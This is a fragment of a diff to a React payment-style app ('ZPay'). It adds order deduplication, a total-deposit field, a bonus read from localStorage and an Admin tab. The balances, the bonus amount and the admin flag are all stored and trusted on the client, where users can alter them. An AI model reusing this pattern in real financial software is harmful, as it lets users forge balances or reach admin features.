+      const bonusAmt = Number(
+        localStorage.getItem("zpay_admin_bonus") || BONUS_AMOUNT,
+      );
+      currentBalance += bonusAmt;
       localStorage.setItem(
         `zpay_balance_${profile.phone}`,
         String(currentBalance),
@@ -2274,18 +3128,38 @@ export default function App() {
     setUpiList(storedUpi ? JSON.parse(storedUpi) : []);
 
     const storedProc = localStorage.getItem(`zpay_processing_${profile.phone}`);
-    setProcessingOrders(storedProc ? JSON.parse(storedProc) : []);
+    const allProc: ProcessingOrder[] = storedProc ? JSON.parse(storedProc) : [];
+    const storedCompleted = localStorage.getItem(
+      `zpay_completed_${profile.phone}`,
+    );
+    const allCompleted: ProcessingOrder[] = storedCompleted
+      ? JSON.parse(storedCompleted)
+      : [];
+    // Deduplicate: filter out any processing orders that are already in completed
+    const completedIds = new Set(allCompleted.map((o) => o.orderId));
+    const dedupedProc = allProc.filter((o) => !completedIds.has(o.orderId));
+    setProcessingOrders(dedupedProc);
+    setCompletedOrders(allCompleted);
+
+    const storedDeposit = localStorage.getItem(
+      `zpay_totaldeposit_${profile.phone}`,
+    );
+    setTotalDeposit(storedDeposit ? Number(storedDeposit) : 0);
   };
 
   const handleComplete = (po: ProcessingOrder) => {
-    const updated = [po, ...processingOrders];
-    setProcessingOrders(updated);
-    if (userProfile?.phone) {
-      localStorage.setItem(
-        `zpay_processing_${userProfile.phone}`,
-        JSON.stringify(updated),
-      );
-    }
+    setProcessingOrders((prev) => {
+      // Deduplicate: do not add if orderId already exists
+      if (prev.some((o) => o.orderId === po.orderId)) return prev;
+      const updated = [po, ...prev];
+      if (userProfile?.phone) {
+        localStorage.setItem(
+          `zpay_processing_${userProfile.phone}`,
+          JSON.stringify(updated),
+        );
+      }
+      return updated;
+    });
   };
 
   // Persist upiList
@@ -2308,6 +3182,7 @@ export default function App() {
     ? `ZP${userProfile.phone.slice(-6)}`
     : "2250586";
 
+  const isAdmin = userProfile?.isAdmin === true;
   const tabs = [
     { id: "home" as ActiveTab, label: "Home", icon: <Home size={20} /> },
     {
@@ -2318,6 +3193,15 @@ export default function App() {
     { id: "tools" as ActiveTab, label: "", icon: <QrCode size={22} /> },
     { id: "team" as ActiveTab, label: "Team", icon: <Users size={20} /> },
     { id: "my" as ActiveTab, label: "My", icon: <User size={20} /> },
+    ...(isAdmin
+      ? [
+          {
+            id: "admin" as ActiveTab,
+            label: "Admin",
+            icon: <Shield size={20} />,
+          },
+        ]
+      : []),
   ];
 
   return (
@@ -2339,12 +3223,19 @@ export default function App() {
             setSellOn={setSellOn}
             balance={balance}
             upiList={upiList}
+            completedOrders={completedOrders}
+            processingOrders={processingOrders}
+            isAdmin={isAdmin}
+            phone={isAuthenticated || ""}
           />
         )}
         {activeTab === "tools" && (
           <ToolsScreen upiList={upiList} setUpiList={setUpiList} />
         )}
         {activeTab === "team" && <TeamScreen />}
+        {activeTab === "admin" && isAdmin && (
+          <AdminTab onLogout={handleLogout} />
+        )}
         {activeTab === "my" && (
           <div className="flex-1 overflow-y-auto pb-24">
             <MyScreen
@@ -2360,6 +3251,7 @@ export default function App() {
               onLogout={handleLogout}
               profile={userProfile}
               balance={balance}
+              totalDeposit={totalDeposit}
               setActiveTab={setActiveTab}
             />
           </div>
@@ -2371,9 +3263,7 @@ export default function App() {
         <div
           className="fixed inset-0 z-50 flex items-center justify-center"
           style={{
-            background: "rgba(255,255,255,0.75)",
-            backdropFilter: "blur(8px)",
-            WebkitBackdropFilter: "blur(8px)",
+            background: "rgba(255,255,255,0.92)",
             maxWidth: 430,
             margin: "0 auto",
             left: "50%",
